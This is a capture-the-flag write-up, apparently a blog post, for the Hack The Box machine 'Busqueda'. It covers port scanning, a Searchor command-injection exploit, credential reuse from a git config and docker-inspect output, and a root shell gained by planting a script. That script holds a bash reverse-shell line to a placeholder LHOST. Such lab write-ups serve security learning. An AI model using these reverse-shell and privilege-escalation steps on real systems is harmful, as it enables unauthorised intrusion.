# Box: Busqueda
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.78.165 -v -p- -T4```

```
Nmap scan report for searcher.htb (10.129.78.185)
Host is up (0.34s latency).
Not shown: 65369 closed tcp ports (reset), 164 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Searcher
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/30%OT=22%CT=1%CU=43868%PV=Y%DS=2%DC=T%G=Y%TM=653FBF
OS:10%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10A%TI=Z
OS:%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M53CST11N
OS:W7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CS
OS:T11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=4
OS:0%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(
OS:R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 11.571 days (since Thu Oct 19 01:53:13 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   446.93 ms 10.10.14.1
2   447.06 ms searcher.htb (10.129.78.185)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 30 15:34:56 2023 -- 1 IP address (1 host up) scanned in 1764.04 seconds
```
From our nmap scan we have 2 open ports, port 22 which runs ssh and port 80 which runs http. Our enumeration today will be focused on port 80



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c2b168c-3cd6-4abe-a7d9-204d873c455b)

We'll add this domain name to our ```/etc/hosts``` file

Now lets navigate back to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b92cb0f7-c047-4dee-bf25-13d998954717)

Scrolling down,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/25743998-e3bb-4668-8613-56f1ceab850e)

Take a look at the version of ```searchor``` running on this machine

Checking google

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a3473cb1-52f6-447f-965e-7ab16893e543)

Lets exploit this



# Exploitation

We will be using this github [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh)

Download this to your machine and make it executable

command:```chmod +x exploit.sh```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/busqueda]
└─$ chmod +x exploit.sh 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/busqueda]
└─$ ls -l exploit.sh
-rwxr-xr-x 1 bl4ck4non bl4ck4non 866 Oct 30 15:33 exploit.sh
```
To run the exploit script

command:```./exploit.sh searcher.htb LHOST LPORT```

Ensure you set your netcat listener before running this command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1f6c0a12-af2d-4f8f-82cd-a7dd7df7a35f)

Nice, we spawned a reverse shell. To stabilize this shell

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5d827207-27d9-44a1-8ccf-07a82c0d79d1)

Lets go ahead to escalate our privileges



# Privilege Escalation

The directory ```/var/www/app``` contains a .git folder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a526bda4-35f2-42a2-8053-5ac6050a3a07)

Inside the folder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1786cfdc-f16c-450d-bf49-29948ad23b73)

That url looks weird actually, there was nothing interesting there when I checked though.

Looking at the way the url was structured, there was something like this ```cody:jh1usoih2bkjaspwe92@gitea.searcher.htb```. This part of the url ```cody:jh1usoih2bkjaspwe92``` actually looks like a username and password.

Lets run the ```sudo -l``` command, then we try the password ```jh1usoih2bkjaspwe92``` for the ```svc``` user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6f1f79d4-397d-4c82-bdec-12d15ffdc19b)

nice nice, it worked. Also, you can see that we have sudo privileges to run the script ```/opt/scripts/system-checkup.py```. 

Checking out the content of the script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a42cab6e-bbfe-47ea-86d8-c16b1439ee9a)

oops, we actually can't view the content of the script, we don't have enough privileges for that. One thing we can try to do is execute the script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4792fec9-4b81-464f-a030-095693e05864)

As you can see from the above screenshot that args are needed to run this script. 

If we try to do a full-checkup we get this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/080ffadd-99d9-4351-86bb-b5492208ccf7)

Lets test the other args

command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps```
command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/85a404b9-4e9f-4bb3-9dbf-4a88d5118601)

You can see fom the above screenshot that the argument ```docker-inspect``` actually stands out.

Reading this [documentation](https://docs.docker.com/engine/reference/commandline/inspect/) I saw that we get a subsection in JSON format.

So, to use ```docker-inspect``` we have to specify the ```container_id```. To get the ```container_id``` we can use the arg ```docker-ps```

command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/baccb61c-71a1-4ed4-8c32-b1e9e6d90d96)

We'll be using those container ids

command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/df070a85-c234-4de0-b37c-f4ea3560cf47)

cool, we were able to get the creds for a database ```gitea```

Lets dump the content of the other container id

command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a6b33fb5a```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f9fd5399-18b9-4234-a9af-672af1715397)

nice nice, we got creds from this container also

We can login as the administrator user on gitea using those passwords we found in the containers.

First lets add the subdomain ```gitea.searcher.htb``` to our ```/etc/hosts``` file

Navigating to the subdomain

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/22d37186-6402-44fe-bd1e-6b955350fcad)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4529b323-72e0-4648-8ad7-fbf7b061081c)

username:```administrator```        password:```yuiu1hoiu4i5ho1uh```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c4126058-4a94-473b-b020-d919306ec7fb)

nice nice, we are in. 

Lets check the scripts

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/365af08d-92d6-4d77-b5f9-91e395c8abc5)

Checking the content of the script I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8ff51cce-7f5d-465f-b1d5-5983287bac68)

This means to run the action ```full-checkup``` a file ```full-checkup.sh``` is being executed.

We can exploit this by creating a malicious bash script that can help us get a reverse shell back to our machine

payload
```bash
#!/bin/bash

bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```
Save this in a file ```full-checkup.sh```, then give it executable permission using the command ```chmod +x full-checkup.sh```. 

Ensure you edit the ```LHOST``` and ```LPORT```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/090a6356-13a4-4ae2-940d-bf2cc11df104)

Now, lets run the ```full-checkup``` command again, this time we'll set up our netcat listener for incoming connections

command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7687e796-88eb-4bef-b06d-428ae27512a3)

We spawned a shell as the root user😎


That will be all for today
<br><br>
[Back To Home](../../index.md)
























